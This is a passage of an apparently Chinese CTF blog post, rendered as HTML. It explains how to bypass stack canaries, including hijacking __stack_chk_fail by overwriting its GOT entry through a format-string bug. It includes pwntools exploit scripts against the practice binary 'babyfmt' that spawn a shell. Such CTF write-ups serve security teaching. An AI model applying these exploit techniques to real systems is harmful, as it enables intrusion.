flag\n'</span>)</span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0</span>x128 + p64(flag_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">'detected ***: '</span>)</span><br><span class="line">p.recvuntil(<span class="string">'&#125;'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h3 id="四、劫持-stack-chk-fail函数"><a href="#四、劫持-stack-chk-fail函数" class="headerlink" title="四、劫持__stack_chk_fail函数"></a>四、劫持__stack_chk_fail函数</h3><p>在开启canary保护的程序中，如果canary不对，程序会转到<strong>stack_chk_fail函数执行，</strong>stack_chk_fail函数是一个普通的延迟绑定函数，可以通过修改GOT表劫持这个函数。利用方式就是通过格式化字符串漏洞来修改GOT表中的值。</p>
+<p>还是直接用CTF题上手（babyfmt），程序开启了canary和NX保护</p>
+<p>main函数中存在栈溢出和格式化字符串漏洞<br><img src="https://s2.ax1x.com/2019/05/07/EyeGNj.png" alt><br>有一个hello函数，留了一个后门<br><img src="https://s2.ax1x.com/2019/05/07/EyeJ4s.png" alt> </p>
+<p>由于栈溢出的长度不够我们覆盖掉返回地址，所以不能利用ROP来改变程序的流程，再一想，程序还存在格式化字符串漏洞，并且开启了canary保护，我们可以通过格式化字符串漏洞来篡改GOT表中__stack_chk_fail存储的地址，将它的地址修改成hello函数地址，然后通过栈溢出来覆盖canary，故意触发__stack_chk_fail函数的执行，相当于执行了hello函数，从而getshell</p>
+<p>exp：</p>
+<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="built_in">from</span> pwn import *</span><br><span class="line"><span class="built_in">from</span> libformatstr import *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">'deepin-terminal'</span>, <span class="string">'-x'</span>, <span class="string">'sh'</span> ,<span class="string">'-c'</span>]</span><br><span class="line">r = <span class="built_in">process</span>(<span class="string">"./babyfmt"</span>)</span><br><span class="line"><span class="built_in">file</span> = ELF(<span class="string">"./babyfmt"</span>)</span><br><span class="line">stack_chk_fail_got = <span class="built_in">file</span>.got[<span class="string">'__stack_chk_fail'</span>]</span><br><span class="line"><span class="built_in">log</span>.info(hex(stack_chk_fail_got))<span class="comment">#0x601018</span></span><br><span class="line">hello_addr = <span class="number">0x400626</span></span><br><span class="line"><span class="comment"># bufsiz = 50</span></span><br><span class="line"><span class="comment"># r.sendline(make_pattern(bufsiz))             </span></span><br><span class="line"><span class="comment"># data = r.recv() </span></span><br><span class="line"><span class="comment"># offset, padding = guess_argnum(data, bufsiz)</span></span><br><span class="line"><span class="built_in">log</span>.info(<span class="string">"offset : "</span> + str(<span class="number">6</span>))</span><br><span class="line"><span class="built_in">log</span>.info(<span class="string">"padding: "</span> + str(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line">p = FormatStr()</span><br><span class="line">p[stack_chk_fail_got] = hello_addr</span><br><span class="line">buf = p.payload(<span class="number">6</span>,<span class="number">0</span>)</span><br><span class="line"><span class="comment">#gdb.attach(r)</span></span><br><span class="line">r.sendline(buf+<span class="string">"a"</span>*(<span class="number">0x60</span>-<span class="built_in">len</span>(buf)))</span><br><span class="line">sleep(<span class="number">0.2</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+
+<h3 id="个人感悟"><a href="#个人感悟" class="headerlink" title="个人感悟"></a>个人感悟</h3><p>以上总结的只是常见的利用手法，其实还有许多绕过canary保护的姿势！通过总结这篇文章，加深了我对二进制安全的理解，也希望能帮助到更多的人。</p>
+<p>本文如有不妥之处，敬请斧正。</p>
+<h3 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h3><p><a href="https://zhakul.top/archives/216" target="_blank" rel="noopener">关于canary的总结</a></p>
+
+        
+        <br />
+        <div id="comment-container">
+        </div>
+        <div id="disqus_thread"></div>
+
+        <div id="lv-container">
+        </div>
+
+    </div>
+</div>
+
+    </div>
+</div>
+
+
+<footer class="footer">
+    <ul class="list-inline text-center">
+        
+        
+
+        
+
+        
+
+        
+
+        
+
+    </ul>
+    
+    <p>
+        <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+        转发请备注<a href=“https://luobuming.github.io”>一筐萝卜</a>的个人博客 <br>
+        本站总访问量<span id="busuanzi_value_site_pv"></span>次
+       </p>
+</footer>
+
+
+
+
+</body>
+
+<script>
+    // We expose some of the variables needed by the front end
+    window.hexo_search_path = "search.json"
+    window.hexo_root = "/"
+    window.isPost = true
+</script>
+<script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script>
+<script src="/js/index.js"></script>
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+</html>
